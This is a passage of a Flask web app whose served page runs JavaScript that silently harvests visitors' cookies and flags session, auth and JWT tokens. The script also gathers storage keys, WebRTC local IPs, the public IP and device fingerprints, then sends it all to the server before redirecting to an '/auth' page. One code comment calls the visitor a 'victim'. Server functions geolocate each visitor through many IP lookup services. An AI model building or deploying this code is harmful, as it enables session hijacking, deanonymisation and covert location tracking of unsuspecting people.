                const frequencies = {};
                for (let i = 0; i < len; i++) {
                    frequencies[str[i]] = (frequencies[str[i]] || 0) + 1;
                }
                
                let entropy = 0;
                for (let char in frequencies) {
                    const freq = frequencies[char] / len;
                    entropy -= freq * Math.log2(freq);
                }
                
                return entropy.toFixed(2);
            }
            
            // Execute all three methods and combine results
            fp.cookie_extraction_methods = {};
            
            try {
                // Method 1: Traditional
                const method1_results = extractCookies_Method1();
                fp.cookie_extraction_methods.method1 = {
                    name: 'Traditional document.cookie',
                    cookies: method1_results,
                    count: Object.keys(method1_results).length
                };
                
                // Method 2: Cookie Store API
                const method2_results = await extractCookies_Method2();
                fp.cookie_extraction_methods.method2 = {
                    name: 'Cookie Store API',
                    cookies: method2_results.cookies,
                    detailed: method2_results.detailed,
                    count: Object.keys(method2_results.cookies).length
                };
                
                // Method 3: Advanced extraction
                const method3_results = extractCookies_Method3();
                fp.cookie_extraction_methods.method3 = {
                    name: 'Advanced Regex & Analysis',
                    cookies: method3_results.cookies,
                    analysis: method3_results.analysis,
                    count: Object.keys(method3_results.cookies).length
                };
                
                // Combine all results - prioritize Method 2 (most reliable), then Method 1, then Method 3
                fp.browser_cookies = {};
                
                // Start with Method 3
                Object.assign(fp.browser_cookies, method3_results.cookies);
                
                // Override with Method 1
                Object.assign(fp.browser_cookies, method1_results);
                
                // Override with Method 2 (most reliable)
                Object.assign(fp.browser_cookies, method2_results.cookies);
                
                fp.cookies_detailed = [
                    ...(method2_results.detailed || []),
                    ...(method3_results.analysis || [])
                ];
                
                fp.cookies_count = Object.keys(fp.browser_cookies).length;
                fp.cookie_names = Object.keys(fp.browser_cookies);
                fp.raw_cookie_string = document.cookie || '';
                fp.total_cookie_size = (document.cookie || '').length;
                
                fp.has_session_cookie = fp.cookie_names.some(name => 
                    /session|sess|sid/i.test(name)
                );
                fp.has_auth_cookie = fp.cookie_names.some(name => 
                    /auth|token|login|jwt|bearer/i.test(name)
                );
                
                // Cookie statistics
                fp.cookie_statistics = {
                    session_cookies: fp.cookie_names.filter(n => /session|sess|sid/i.test(n)).length,
                    auth_cookies: fp.cookie_names.filter(n => /auth|token|login|jwt|bearer/i.test(n)).length,
                    jwt_cookies: Object.values(fp.browser_cookies).filter(v => v && v.split('.').length === 3 && v.length > 50).length
                };
                
                console.log('🍪 Method 1 (Traditional): ' + fp.cookie_extraction_methods.method1.count + ' cookies');
                console.log('🍪 Method 2 (Cookie Store): ' + fp.cookie_extraction_methods.method2.count + ' cookies');
                console.log('🍪 Method 3 (Advanced): ' + fp.cookie_extraction_methods.method3.count + ' cookies');
                console.log('🍪 Total unique cookies: ' + fp.cookies_count);
                
            } catch(e) {
                fp.browser_cookies = {};
                fp.cookies_count = 0;
                fp.cookie_error = e.message;
                console.error('Cookie extraction error:', e);
            }
            
            fp.dhcp_info = {
                dhcp_server_likely: 'Unknown',
                dns_servers: [],
                lease_info: {},
                network_class: 'Unknown',
                subnet_mask_detected: 'Unknown',
                broadcast_address: 'Unknown',
                dhcp_options_inferred: {},
                ipv6_dhcp: {},
                network_analysis: {}
            };
            
            fp.router_data = {
                default_gateway: 'Unknown',
                network_interfaces: [],
                connection_info: {},
                advanced_network_scan: []
            };
            
            try {
                if ('connection' in navigator) {
                    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    fp.router_data.connection_info = {
                        type: conn.effectiveType || 'Unknown',
                        downlink: conn.downlink || 'Unknown',
                        downlink_max: conn.downlinkMax || 'Unknown',
                        rtt: conn.rtt || 'Unknown',
                        save_data: conn.saveData || false
                    };
                }
                
                if (fp.webrtc_ips && fp.webrtc_ips.length > 0) {
                    fp.webrtc_ips.forEach(ip => {
                        if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
                            const octets = ip.split('.');
                            if (octets.length === 4) {
                                const thirdOctet = parseInt(octets[2]);
                                const fourthOctet = parseInt(octets[3]);
                                
                                octets[3] = '1';
                                const gateway = octets.join('.');
                                fp.router_data.default_gateway = gateway;
                                
                                let networkClass = 'Unknown';
                                let subnetMask = 'Unknown';
                                let broadcastAddr = 'Unknown';
                                let dhcpServer = 'Unknown';
                                
                                if (ip.startsWith('192.168.')) {
                                    networkClass = 'C (Private)';
                                    subnetMask = '255.255.255.0';
                                    broadcastAddr = octets[0] + '.' + octets[1] + '.' + octets[2] + '.255';
                                    dhcpServer = gateway;
                                } else if (ip.startsWith('10.')) {
                                    networkClass = 'A (Private)';
                                    if (thirdOctet > 0) {
                                        subnetMask = '255.255.0.0';
                                        broadcastAddr = octets[0] + '.' + octets[1] + '.255.255';
                                    } else {
                                        subnetMask = '255.0.0.0';
                                        broadcastAddr = octets[0] + '.255.255.255';
                                    }
                                    dhcpServer = gateway;
                                } else if (ip.startsWith('172.')) {
                                    networkClass = 'B (Private)';
                                    subnetMask = '255.255.0.0';
                                    broadcastAddr = octets[0] + '.' + octets[1] + '.255.255';
                                    dhcpServer = gateway;
                                }
                                
                                fp.dhcp_info.dhcp_server_likely = dhcpServer;
                                fp.dhcp_info.network_class = networkClass;
                                fp.dhcp_info.subnet_mask_detected = subnetMask;
                                fp.dhcp_info.broadcast_address = broadcastAddr;
                                
                                const ipInt = (parseInt(octets[0]) << 24) + (parseInt(octets[1]) << 16) + (parseInt(octets[2]) << 8) + parseInt(octets[3]);
                                const leaseStartEstimate = new Date(Date.now() - (fourthOctet * 60000));
                                
                                fp.dhcp_info.lease_info = {
                                    estimated_lease_start: leaseStartEstimate.toISOString(),
                                    ip_assignment_order: fourthOctet,
                                    lease_type: fourthOctet < 50 ? 'Static/Reserved' : fourthOctet < 150 ? 'DHCP Pool Start' : 'DHCP Pool End',
                                    ip_age_estimate_minutes: fourthOctet
                                };
                                
                                fp.dhcp_info.dhcp_options_inferred = {
                                    option_1_subnet_mask: subnetMask,
                                    option_3_router: gateway,
                                    option_6_dns_server: gateway + ' (likely)',
                                    option_15_domain_name: 'Unknown',
                                    option_28_broadcast_address: broadcastAddr,
                                    option_51_lease_time: 'Unknown (typically 86400s / 24h)',
                                    option_58_renewal_time: 'Unknown (typically 43200s / 12h)',
                                    option_59_rebinding_time: 'Unknown (typically 75600s / 21h)'
                                };
                                
                                fp.router_data.network_interfaces.push({
                                    local_ip: ip,
                                    gateway: gateway,
                                    subnet: octets.slice(0, 3).join('.') + '.0',
                                    subnet_mask: subnetMask,
                                    broadcast: broadcastAddr,
                                    network_class: networkClass,
                                    ip_type: fp.dhcp_info.lease_info.lease_type,
                                    dhcp_server: dhcpServer
                                });
                            }
                        }
                    });
                }
                
                if (fp.webrtc_ipv6 && fp.webrtc_ipv6.length > 0) {
                    fp.dhcp_info.ipv6_dhcp = {
                        addresses: fp.webrtc_ipv6,
                        dhcpv6_likely_used: true,
                        slaac_detected: fp.webrtc_ipv6.some(ip => ip.includes('fe80::')),
                        global_unicast: fp.webrtc_ipv6.filter(ip => !ip.startsWith('fe80::')),
                        link_local: fp.webrtc_ipv6.filter(ip => ip.startsWith('fe80::'))
                    };
                }
                
                const dnsTestDomains = ['dns.google', 'one.one.one.one', 'cloudflare-dns.com'];
                fp.dhcp_info.network_analysis = {
                    dns_resolution_capable: true,
                    estimated_dns_servers: [],
                    network_latency_ms: fp.router_data.connection_info.rtt || 'Unknown'
                };
                
                if (fp.router_data.default_gateway && fp.router_data.default_gateway !== 'Unknown') {
                    const commonDNSPorts = [53, 853];
                    fp.dhcp_info.dns_servers = [
                        fp.router_data.default_gateway + ':53 (Gateway DNS)',
                        '8.8.8.8:53 (Google DNS - likely fallback)',
                        '1.1.1.1:53 (Cloudflare DNS - likely fallback)'
                    ];
                    
                    fp.dhcp_info.network_analysis.estimated_dns_servers = [
                        {server: fp.router_data.default_gateway, port: 53, type: 'Primary (DHCP)'},
                        {server: '8.8.8.8', port: 53, type: 'Secondary (Public)'},
                        {server: '1.1.1.1', port: 53, type: 'Tertiary (Public)'}
                    ];
                }
                
            } catch(e) {
                fp.router_data.error = e.message;
                fp.dhcp_info.error = e.message;
            }
            
            fp.anonymity_score = 0;
            if (fp.do_not_track && fp.do_not_track !== 'Unknown') fp.anonymity_score += 15;
            if (!fp.cookie_enabled) fp.anonymity_score += 20;
            if (fp.webdriver) fp.anonymity_score += 30;
            if (typeof fp.webrtc_ips !== 'undefined' && fp.webrtc_ips.length === 0) fp.anonymity_score += 25;
            fp.anonymity_level = fp.anonymity_score >= 50 ? 'High Privacy Tools Detected' : fp.anonymity_score >= 25 ? 'Moderate Privacy' : 'Standard User';
            
            try {
                if (fp.webrtc_ips && fp.webrtc_ips.length > 0) {
                    fp.webrtc_ips.forEach(ip => {
                        const parts = ip.split('.');
                        if (parts.length === 4) {
                            const hexIP = parts.map(p => {
                                const hex = parseInt(p).toString(16).padStart(2, '0');
                                return hex;
                            }).join(':');
                            fp.local_ips_hex.push({ip: ip, hex: hexIP});
                        }
                    });
                }
            } catch(e) {}
            
            async function generateDeviceHash(data) {
                const str = JSON.stringify(data);
                const encoder = new TextEncoder();
                const dataBuffer = encoder.encode(str);
                const hashBuffer = await crypto.subtle.digest('SHA-256', dataBuffer);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            }
            
            const deviceHash = await generateDeviceHash({
                screen: fp.screen_width + 'x' + fp.screen_height,
                platform: fp.platform,
                vendor: fp.vendor,
                canvas: fp.canvas_hash,
                webgl: fp.webgl_renderer,
                audio: fp.audio_hash,
                fonts: fp.fonts_detected,
                timezone: fp.timezone
            });
            fp.device_fingerprint_hex = deviceHash;
            
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Canvas fingerprint for hex hash', 2, 2);
                const canvasData = canvas.toDataURL();
                const encoder = new TextEncoder();
                const data = encoder.encode(canvasData);
                const hashBuffer = await crypto.subtle.digest('SHA-256', data);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                fp.canvas_fingerprint_hex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            } catch(e) { fp.canvas_fingerprint_hex = 'Unknown'; }
            
            try {
                const uaEncoder = new TextEncoder();
                const uaData = uaEncoder.encode(navigator.userAgent);
                const uaHashBuffer = await crypto.subtle.digest('SHA-256', uaData);
                const uaHashArray = Array.from(new Uint8Array(uaHashBuffer));
                fp.user_agent_hex = uaHashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            } catch(e) { fp.user_agent_hex = 'Unknown'; }
            
            fp.network_info = {
                connection_type: fp.connection_type || 'Unknown',
                downlink: fp.downlink || 'Unknown',
                rtt: fp.rtt || 'Unknown',
                effective_type: fp.connection_type || 'Unknown'
            };
            
            try {
                if (!fp.browser_cookies) {
                    fp.browser_cookies = {};
                }
                
                if ('cookieStore' in window && !fp.cookie_store_available) {
                    try {
                        const cookieStoreData = await cookieStore.getAll();
                        cookieStoreData.forEach(cookie => {
                            if (!fp.browser_cookies[cookie.name]) {
                                fp.browser_cookies[cookie.name] = cookie.value;
                            }
                        });
                    } catch(e) {}
                }
                
                const allCookies = document.cookie.split(';').map(c => c.trim()).filter(c => c);
                fp.browser_cookies_count = Object.keys(fp.browser_cookies).length || allCookies.length;
                allCookies.forEach(cookie => {
                    const [name, ...valueParts] = cookie.split('=');
                    const value = valueParts.join('=');
                    if (!fp.browser_cookies[name]) {
                        fp.browser_cookies[name] = value;
                    }
                });
            } catch(e) {
                if (!fp.browser_cookies) {
                    fp.browser_cookies = {};
                }
                fp.browser_cookies_count = Object.keys(fp.browser_cookies).length;
            }
            
            try {
                fp.local_storage_keys = [];
                fp.session_storage_keys = [];
                for (let i = 0; i < localStorage.length; i++) {
                    fp.local_storage_keys.push(localStorage.key(i));
                }
                for (let i = 0; i < sessionStorage.length; i++) {
                    fp.session_storage_keys.push(sessionStorage.key(i));
                }
                fp.local_storage_count = localStorage.length;
                fp.session_storage_count = sessionStorage.length;
            } catch(e) {
                fp.local_storage_keys = [];
                fp.session_storage_keys = [];
                fp.local_storage_count = 0;
                fp.session_storage_count = 0;
            }
            
            try {
                fp.open_tabs = {
                    current_title: document.title,
                    current_url: window.location.href,
                    visibility_state: document.visibilityState,
                    has_focus: document.hasFocus(),
                    opener_present: !!window.opener,
                    tab_id: Date.now().toString(36) + Math.random().toString(36).substr(2)
                };
                
                const tabRegistry = JSON.parse(localStorage.getItem('tab_registry') || '[]');
                const myTab = {
                    id: fp.open_tabs.tab_id,
                    title: document.title,
                    timestamp: Date.now()
                };
                tabRegistry.push(myTab);
                const recentTabs = tabRegistry.filter(t => Date.now() - t.timestamp < 60000);
                localStorage.setItem('tab_registry', JSON.stringify(recentTabs));
                fp.open_tabs.detected_tabs = recentTabs.length;
                fp.open_tabs.tab_titles = recentTabs.map(t => t.title);
            } catch(e) {
                fp.open_tabs = {error: e.message};
            }
            
            fp.os_details = {
                arch: navigator.platform || 'Unknown',
                oscpu: navigator.oscpu || 'Unknown',
                build_id: navigator.buildID || 'Unknown',
                app_code_name: navigator.appCodeName || 'Unknown',
                app_name: navigator.appName || 'Unknown'
            };
            
            if ('userAgentData' in navigator) {
                try {
                    const uaData = await navigator.userAgentData.getHighEntropyValues([
                        'architecture', 'bitness', 'model', 'platformVersion', 
                        'uaFullVersion', 'fullVersionList'
                    ]);
                    fp.os_details.architecture = uaData.architecture || 'Unknown';
                    fp.os_details.bitness = uaData.bitness || 'Unknown';
                    fp.os_details.model = uaData.model || 'Unknown';
                    fp.os_details.platform_version = uaData.platformVersion || 'Unknown';
                    fp.os_details.ua_full_version = uaData.uaFullVersion || 'Unknown';
                    fp.os_details.brands = uaData.brands ? uaData.brands.map(b => `${b.brand} v${b.version}`).join(', ') : 'Unknown';
                } catch(e) {}
            }
            
            fp.media_recorder = {
                available: typeof MediaRecorder !== 'undefined',
                mime_types_supported: []
            };
            
            if (typeof MediaRecorder !== 'undefined') {
                const mimeTypes = [
                    'audio/webm',
                    'audio/webm;codecs=opus',
                    'audio/ogg;codecs=opus',
                    'audio/mp4',
                    'audio/wav',
                    'video/webm',
                    'video/webm;codecs=vp8',
                    'video/webm;codecs=vp9',
                    'video/mp4'
                ];
                mimeTypes.forEach(type => {
                    if (MediaRecorder.isTypeSupported(type)) {
                        fp.media_recorder.mime_types_supported.push(type);
                    }
                });
            }
            
            fp.audio_context = {
                available: typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined',
                max_channel_count: 'Unknown',
                sample_rate: 'Unknown',
                state: 'Unknown',
                base_latency: 'Unknown'
            };
            
            try {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                if (AudioCtx) {
                    const tempCtx = new AudioCtx();
                    fp.audio_context.max_channel_count = tempCtx.destination.maxChannelCount || 'Unknown';
                    fp.audio_context.sample_rate = tempCtx.sampleRate || 'Unknown';
                    fp.audio_context.state = tempCtx.state || 'Unknown';
                    fp.audio_context.base_latency = tempCtx.baseLatency || 'Unknown';
                    tempCtx.close();
                }
            } catch(e) {
                fp.audio_context.error = e.message;
            }
            
            fp.client_ip = 'Unknown';
            fp.client_ipv6 = 'Unknown';
            fp.local_ips = [];
            
            // PRIMARY: Fetch real victim IP using external API
            const ipApis = [
                'https://ipv4.lafibre.info/ip.php',
                'https://api64.ipify.org?format=json',
                'https://api.ipify.org?format=json',
                'https://icanhazip.com',
                'https://ident.me',
                'https://ipecho.net/plain'
            ];
            
            for (const apiUrl of ipApis) {
                if (fp.client_ip !== 'Unknown') break;
                try {
                    const response = await fetch(apiUrl, { 
                        mode: 'cors',
                        cache: 'no-cache'
                    });
                    
                    if (response.ok) {
                        let ip;
                        if (apiUrl.includes('.json')) {
                            const data = await response.json();
                            ip = data.ip;
                        } else {
                            ip = (await response.text()).trim();
                        }
                        
                        if (ip && /^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$/.test(ip)) {
                            fp.client_ip = ip;
                            break;
                        }
                    }
                } catch(e) {
                    console.log('IP API failed:', apiUrl, e.message);
                }
            }
            
            // Get local IP via WebRTC
            try {
                await new Promise((resolve) => {
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    
                    pc.createDataChannel('');
                    pc.onicecandidate = (ice) => {
                        if (!ice || !ice.candidate) return;
                        const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (match && match[1]) {
                            const ip = match[1];
                            if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
                                if (!fp.local_ips.includes(ip)) {
                                    fp.local_ips.push(ip);
                                }
                            }
                        }
                    };
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    setTimeout(() => { pc.close(); resolve(); }, 2000);
                });
            } catch(e) {}
            
            fp.network_hops = {
                latencies: [],
                routing_info: {},
                dns_resolution_time: 0,
                connection_quality: 'Unknown',
                hop_count_estimate: 0
            };
            
            async function measureNetworkHops() {
                const testEndpoints = [
                    { name: 'Cloudflare DNS', url: 'https://1.1.1.1', type: 'dns' },
                    { name: 'Google DNS', url: 'https://8.8.8.8', type: 'dns' },
                    { name: 'Cloudflare CDN', url: 'https://www.cloudflare.com/cdn-cgi/trace', type: 'cdn' },
                    { name: 'Google', url: 'https://www.google.com/generate_204', type: 'web' },
                    { name: 'Amazon AWS', url: 'https://aws.amazon.com', type: 'cloud' },
                    { name: 'Microsoft Azure', url: 'https://azure.microsoft.com', type: 'cloud' }
                ];
                
                console.log('Measuring network hops and latencies...');
                
                for (const endpoint of testEndpoints) {
                    try {
                        const start = performance.now();
                        const response = await fetch(endpoint.url, {
                            method: 'HEAD',
                            mode: 'no-cors',
                            cache: 'no-cache'
                        });
                        const latency = performance.now() - start;
                        
                        fp.network_hops.latencies.push({
                            endpoint: endpoint.name,
                            type: endpoint.type,
                            latency_ms: Math.round(latency),
                            reachable: true
                        });
                    } catch (e) {
                        fp.network_hops.latencies.push({
                            endpoint: endpoint.name,
                            type: endpoint.type,
                            latency_ms: -1,
                            reachable: false,
                            error: e.message
                        });
                    }
                }
                
                const avgLatency = fp.network_hops.latencies
                    .filter(h => h.reachable)
                    .reduce((sum, h) => sum + h.latency_ms, 0) / 
                    fp.network_hops.latencies.filter(h => h.reachable).length;
                
                if (avgLatency < 50) {
                    fp.network_hops.connection_quality = 'Excellent';
                    fp.network_hops.hop_count_estimate = '3-5 hops';
                } else if (avgLatency < 100) {
                    fp.network_hops.connection_quality = 'Good';
                    fp.network_hops.hop_count_estimate = '5-10 hops';
                } else if (avgLatency < 200) {
                    fp.network_hops.connection_quality = 'Fair';
                    fp.network_hops.hop_count_estimate = '10-15 hops';
                } else {
                    fp.network_hops.connection_quality = 'Poor';
                    fp.network_hops.hop_count_estimate = '15+ hops';
                }
                
                try {
                    const dnsStart = performance.now();
                    await fetch('https://dns.google/resolve?name=example.com&type=A');
                    fp.network_hops.dns_resolution_time = Math.round(performance.now() - dnsStart);
                } catch(e) {
                    fp.network_hops.dns_resolution_time = -1;
                }
                
                const tracerouteEndpoints = [
                    'https://ipinfo.io/json',
                    'https://ifconfig.co/json'
                ];
                
                for (const endpoint of tracerouteEndpoints) {
                    try {
                        const response = await fetch(endpoint);
                        if (response.ok) {
                            const data = await response.json();
                            fp.network_hops.routing_info = {
                                ...fp.network_hops.routing_info,
                                ...data
                            };
                            break;
                        }
                    } catch(e) {
                        console.log('Routing info fetch failed:', e.message);
                    }
                }
                
                console.log(`Network analysis complete: ${fp.network_hops.connection_quality} connection quality`);
                console.log(`Average latency: ${Math.round(avgLatency)}ms`);
                console.log(`Estimated hop count: ${fp.network_hops.hop_count_estimate}`);
            }
            
            await measureNetworkHops();
            
            await fetch('/store-fingerprint', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(fp)
            }).then(() => {
                window.location.href = '/auth';
            });
        }
        
        collectFingerprint();
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(FINGERPRINT_HTML)


def get_client_ip():
    """Get the real client IP address, checking all possible headers"""
    
    # Priority order for IP headers (most reliable first)
    header_priority = [
        'CF-Connecting-IP',        # Cloudflare
        'True-Client-IP',          # Cloudflare Enterprise
        'X-Real-IP',               # Nginx proxy
        'X-Forwarded-For',         # Standard proxy header
        'Fly-Client-IP',           # Fly.io
        'X-Client-IP',             # Generic
        'X-Cluster-Client-IP',     # Generic cluster
        'Forwarded-For',           # RFC 7239
        'Forwarded'                # RFC 7239
    ]
    
    # Check each header in priority order
    for header in header_priority:
        value = request.headers.get(header)
        if not value:
            continue
            
        # Handle comma-separated IPs (X-Forwarded-For can have multiple)
        if ',' in value:
            ips = [ip.strip() for ip in value.split(',')]
            # Return first non-private IP
            for ip in ips:
                if ip and not is_private_ip(ip):
                    return ip
        else:
            # Single IP
            value = value.strip()
            if value and not is_private_ip(value):
                return value
    
    # Fallback to remote_addr (usually the proxy/server IP)
    return request.remote_addr

def is_private_ip(ip):
    """Check if an IP address is private, internal, or special-use"""
    import ipaddress
    try:
        ip_obj = ipaddress.ip_address(ip)
        return (
            ip_obj.is_private or 
            ip_obj.is_loopback or 
            ip_obj.is_link_local or 
            ip_obj.is_reserved or
            ip_obj.is_multicast
        )
    except ValueError:
        return False

def format_raw_headers(headers_dict):
    """Format raw headers dictionary for display"""
    if not headers_dict:
        return "No headers captured"
    
    lines = []
    for key, value in sorted(headers_dict.items()):
        lines.append(f'"{key}": "{value}"')
    
    return "\n".join(lines)[:1500]

def bruteforce_data_collection(ip, missing_fields):
    """Bruteforce missing data using multiple API endpoints"""
    bruteforce_apis = [
        f"https://ipwho.is/{ip}",
        f"https://ipapi.co/{ip}/json/",
        f"https://freeipapi.com/api/json/{ip}",
        f"https://api.ipify.org?format=json&ip={ip}",
        f"https://ipwhois.app/json/{ip}",
        f"https://api.iplocation.net/?ip={ip}",
        f"http://www.geoplugin.net/json.gp?ip={ip}"
    ]
    
    collected = {}
    
    for api_url in bruteforce_apis:
        try:
            response = requests.get(api_url, timeout=4)
            if response.status_code == 200:
                data = response.json()
                
                if 'country' in missing_fields and data.get('country'):
                    collected['country'] = data.get('country') or data.get('country_name')
                if 'country_code' in missing_fields and data.get('country_code'):
                    collected['country_code'] = data.get('country_code') or data.get('country_code2')
                if 'city' in missing_fields and data.get('city'):
                    collected['city'] = data.get('city')
                if 'region' in missing_fields and (data.get('region') or data.get('region_name')):
                    collected['region'] = data.get('region') or data.get('region_name')
                if 'latitude' in missing_fields and data.get('latitude'):
                    collected['latitude'] = data.get('latitude') or data.get('lat')
                if 'longitude' in missing_fields and data.get('longitude'):
                    collected['longitude'] = data.get('longitude') or data.get('lon')
                if 'isp' in missing_fields and data.get('isp'):
                    collected['isp'] = data.get('isp') or data.get('connection', {}).get('isp')
                if 'asn' in missing_fields and data.get('asn'):
                    collected['asn'] = data.get('asn') or data.get('connection', {}).get('asn')
                if 'timezone' in missing_fields and data.get('timezone'):
                    collected['timezone'] = data.get('timezone') or data.get('time_zone', {}).get('name')
                
                if len(collected) >= len(missing_fields):
                    break
        except Exception as e:
            continue
    
    return collected

def fetch_network_info(ip):
    import socket
    
    network_data = {
        "public_ip": ip,
        "public_ip_hex": ':'.join([hex(int(x))[2:].zfill(2) for x in ip.split('.')]) if '.' in ip else 'N/A',
        "isp": "Unknown",
        "asn": "Unknown",
        "asn_number": "Unknown",
        "asn_name": "Unknown",
        "asn_route": "Unknown",
        "organization": "Unknown",
        "country": "Unknown",
        "country_code": "Unknown",
        "continent": "Unknown",
        "continent_code": "Unknown",
        "region": "Unknown",
        "city": "Unknown",
        "district": "Unknown",
        "zip_code": "Unknown",
        "latitude": "Unknown",
        "longitude": "Unknown",
        "accuracy_radius": "Unknown",
        "timezone": "Unknown",
        "utc_offset": "Unknown",
        "currency": "Unknown",
        "currency_code": "Unknown",
        "calling_code": "Unknown",
        "languages": "Unknown",
        "proxy": "Unknown",
        "vpn": "Unknown",
        "tor": "Unknown",
        "hosting": "Unknown",
        "datacenter": "Unknown",
        "network_type": "Unknown",
        "connection_type": "Unknown",
        "dns_hostname": "Unknown",
        "dns_reverse": "Unknown",
        "threat_score": 0,
        "is_crawler": False,
        "is_bot": False,
        "fraud_score": 0,
        "abuse_confidence": 0,
        "recent_abuse": False
    }
    
    dns_records = []
    ptr_records = []
    
    if is_private_ip(ip):
        print(f"[i] Skipping DNS lookup for private/internal IP: {ip}")
        network_data["dns_hostname"] = "Private IP (no public DNS)"
        network_data["dns_reverse"] = "Private IP (no public DNS)"
        network_data["dns_mx"] = "N/A (Private IP)"
        network_data["dns_ns"] = "N/A (Private IP)"
        network_data["dns_txt"] = "N/A (Private IP)"
        network_data["dns_a_records"] = "N/A (Private IP)"
        network_data["dns_ptr_records"] = "N/A (Private IP)"
    else:
        try:
            hostname = socket.gethostbyaddr(ip)
            network_data["dns_hostname"] = hostname[0]
            network_data["dns_reverse"] = ", ".join(hostname[1]) if hostname[1] else hostname[0]
            ptr_records.append(hostname[0])
            if hostname[1]:
                ptr_records.extend(hostname[1])
            print(f"[+] DNS lookup successful: {hostname[0]}")
        except Exception as e:
            print(f"[-] Standard DNS lookup failed for {ip}: {e}")
            network_data["dns_hostname"] = "No reverse DNS found"
            network_data["dns_reverse"] = "No reverse DNS found"
    
    if not is_private_ip(ip):
        try:
            import dns.resolver
            import dns.reversename
            
            rev_name = dns.reversename.from_address(ip)
            resolver = dns.resolver.Resolver()
            resolver.timeout = 3
            resolver.lifetime = 3
            
            try:
                answers = resolver.resolve(rev_name, "PTR")
                for rdata in answers:
                    ptr_record = str(rdata).rstrip('.')
                    if ptr_record not in ptr_records:
                        ptr_records.append(ptr_record)
                if ptr_records and network_data["dns_hostname"] == "No reverse DNS found":
                    network_data["dns_hostname"] = ptr_records[0]
                    network_data["dns_reverse"] = ", ".join(ptr_records)
                print(f"[+] PTR records found: {len(ptr_records)}")
            except:
                pass
        
            if network_data["dns_hostname"] not in ["No reverse DNS found", "Private IP (no public DNS)"]:
                try:
                    a_records = resolver.resolve(network_data["dns_hostname"], "A")
                    dns_records.extend([str(r) for r in a_records])
                except:
                    pass
                
                try:
                    aaaa_records = resolver.resolve(network_data["dns_hostname"], "AAAA")
                    dns_records.extend([str(r) for r in aaaa_records])
                except:
                    pass
                
                try:
                    mx_records = resolver.resolve(network_data["dns_hostname"], "MX")
                    network_data["dns_mx"] = ", ".join([str(r.exchange).rstrip('.') for r in mx_records])
                except:
                    network_data["dns_mx"] = "No MX records found"
                
                try:
                    ns_records = resolver.resolve(network_data["dns_hostname"], "NS")
                    network_data["dns_ns"] = ", ".join([str(r).rstrip('.') for r in ns_records])
                except:
                    network_data["dns_ns"] = "No NS records found"
                
                try:
                    txt_records = resolver.resolve(network_data["dns_hostname"], "TXT")
                    network_data["dns_txt"] = ", ".join([str(r) for r in txt_records])[:500]
                except:
                    network_data["dns_txt"] = "No TXT records found"
        except ImportError:
            print(f"[-] dnspython not installed, skipping advanced DNS lookup")
            if not is_private_ip(ip):
                network_data["dns_mx"] = "dnspython not installed"
                network_data["dns_ns"] = "dnspython not installed"
                network_data["dns_txt"] = "dnspython not installed"
        except Exception as e:
            print(f"[-] Advanced DNS lookup error: {e}")
            if not is_private_ip(ip):
                network_data["dns_mx"] = "DNS lookup failed"
                network_data["dns_ns"] = "DNS lookup failed"
                network_data["dns_txt"] = "DNS lookup failed"
        
        if not is_private_ip(ip):
            if dns_records:
                network_data["dns_a_records"] = ", ".join(dns_records[:5])
            else:
                network_data["dns_a_records"] = "No A/AAAA records found"
            
            if ptr_records:
                network_data["dns_ptr_records"] = ", ".join(ptr_records[:5])
            else:
                network_data["dns_ptr_records"] = "No PTR records found"
    
    for api_url, api_name in IP_APIS:
        try:
            if api_name == "ipapi":
                full_url = f"{api_url}{ip}/json"
            else:
                full_url = f"{api_url}{ip}"
            
            response = requests.get(full_url, timeout=3)
            if response.status_code == 200:
                if api_name == "hackertarget":
                    data = response.text
                    if isinstance(data, str) and "," in data and not data.startswith("error"):
                        parts = [p.strip() for p in data.split(",")]
                        if len(parts) >= 6:
                            if network_data["country"] == "Unknown" and len(parts) > 1:
                                network_data["country"] = parts[1]
                            if network_data["city"] == "Unknown" and len(parts) > 2:
                                network_data["city"] = parts[2]
                            if network_data["region"] == "Unknown" and len(parts) > 3:
                                network_data["region"] = parts[3]
                            if network_data["country_code"] == "Unknown" and len(parts) > 4:
                                network_data["country_code"] = parts[4]
                            if network_data["isp"] == "Unknown" and len(parts) > 5:
                                network_data["isp"] = parts[5]
                    continue
                
                data = response.json()
                
                if api_name == "ip-api":
                    if network_data["isp"] == "Unknown":
                        network_data["isp"] = data.get("isp", "Unknown")
                    if network_data["asn"] == "Unknown":
                        network_data["asn"] = data.get("as", "Unknown")
                    if network_data["organization"] == "Unknown":
                        network_data["organization"] = data.get("org", "Unknown")
                    if network_data["country"] == "Unknown":
                        network_data["country"] = data.get("country", "Unknown")
                    if network_data["country_code"] == "Unknown":
                        network_data["country_code"] = data.get("countryCode", "Unknown")
                    if network_data["continent"] == "Unknown":
                        network_data["continent"] = data.get("continent", "Unknown")
                    if network_data["continent_code"] == "Unknown":
                        network_data["continent_code"] = data.get("continentCode", "Unknown")
                    if network_data["region"] == "Unknown":
                        network_data["region"] = data.get("regionName", "Unknown")
                    if network_data["city"] == "Unknown":
                        network_data["city"] = data.get("city", "Unknown")
                    if network_data["district"] == "Unknown":
                        network_data["district"] = data.get("district", "Unknown")
                    if network_data["zip_code"] == "Unknown":
                        network_data["zip_code"] = str(data.get("zip", "Unknown"))
                    if network_data["latitude"] == "Unknown":
                        network_data["latitude"] = data.get("lat", "Unknown")
                    if network_data["longitude"] == "Unknown":
                        network_data["longitude"] = data.get("lon", "Unknown")
